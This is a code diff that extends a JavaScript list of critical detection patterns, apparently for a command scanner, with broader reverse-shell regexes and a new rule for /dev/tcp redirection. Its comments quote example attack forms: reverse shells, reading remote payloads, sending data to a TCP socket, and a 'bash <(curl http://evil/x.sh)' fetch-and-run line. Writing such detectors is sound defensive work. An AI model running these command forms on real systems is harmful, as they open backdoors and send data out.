@@ -131,7 +131,27 @@ const CRITICAL_PATTERNS = [
     // The negation excludes `\n` and `;` (statement boundaries) but
     // NOT `&` / `|` because the construction itself uses `>&` for
     // file-descriptor redirection.
-    re: /\bbash\s+-i\b[^\n;]*\/dev\/tcp\//,
+    // (v1.10.120) Extended to cover all common shell wrappers
+    // (sh / zsh / fish / ksh) and the no-`-i` variant
+    // (`bash >& /dev/tcp/...` without interactive flag is still a
+    // reverse shell — just non-interactive). The original rule only
+    // matched `bash -i` which left every other variant LOW.
+    re: /\b(?:bash|sh|zsh|fish|ksh)\s+(?:-[a-zA-Z]+\s+)*[^\n;]*\/dev\/tcp\//,
+  },
+  // (v1.10.120) Raw /dev/tcp/<host>/<port> file-descriptor
+  // redirection without a shell wrapper. Covers the forms that
+  // reverse-shell misses because there's no leading `bash`/`sh`:
+  //   exec 196<>/dev/tcp/host/port       persistent socket FD
+  //   cat < /dev/tcp/host/port           read remote payload
+  //   echo cmd > /dev/tcp/host/port      data exfil to TCP socket
+  //   (echo >/dev/tcp/h/p) 2>/dev/null   port-check disguise
+  // No legitimate use in production worker context — admins who
+  // want a port check should use `nc -zv` or `bash` shell builtin
+  // explicitly with operator review.
+  {
+    code: 'devtcp-redirect',
+    label: '/dev/tcp/host/port file-descriptor redirection (bash backdoor)',
+    re: /\/dev\/tcp\/[A-Za-z0-9._-]+\/\d+/,
   },
   // (v1.10.59) Process substitution feeding a network fetch into a
   // shell — `bash <(curl http://evil/x.sh)`, `source <(wget -O- ...)`,
